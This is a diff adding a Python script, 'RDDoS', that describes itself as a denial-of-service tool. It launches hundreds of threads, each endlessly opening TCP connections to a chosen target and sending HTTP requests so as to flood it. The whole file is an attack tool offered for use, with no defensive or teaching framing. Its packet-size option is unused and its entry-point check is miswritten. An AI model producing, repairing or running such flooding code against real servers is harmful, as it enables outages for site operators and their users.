@@ -1,0 +1,38 @@
+import socket
+import threading
+import argparse
+
+def flood_server(target_ip, target_port, packet_size):
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((target_ip, target_port))
+        sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+        sock.close()
+
+def main():
+    parser = argparse.ArgumentParser(description="RDDoS - A Simple Denial of Service Tool")
+    parser.add_argument("-t", "--target", help="Target IP address", required=True)
+    parser.add_argument("-p", "--port", help="Target port number", type=int, default=80)
+    parser.add_argument("-s", "--size", help="Packet size", type=int, default=1024)
+    parser.add_argument("-n", "--num-threads", help="Number of threads", type=int, default=500)
+
+    args = parser.parse_args()
+
+    target_ip = args.target
+    target_port = args.port
+    packet_size = args.size
+    num_threads = args.num_threads
+
+    threads = []
+    for i in range(num_threads):
+        t = threading.Thread(target=flood_server, args=(target_ip, target_port, packet_size))
+        t.daemon = True
+        threads.append(t)
+        t.start()
+
+    print(f"RDDoS started with {num_threads} threads, targeting {target_ip}:{target_port} with packet size {packet_size} bytes.")
+    while True:
+        pass
+
+if name == "main":
+    main()
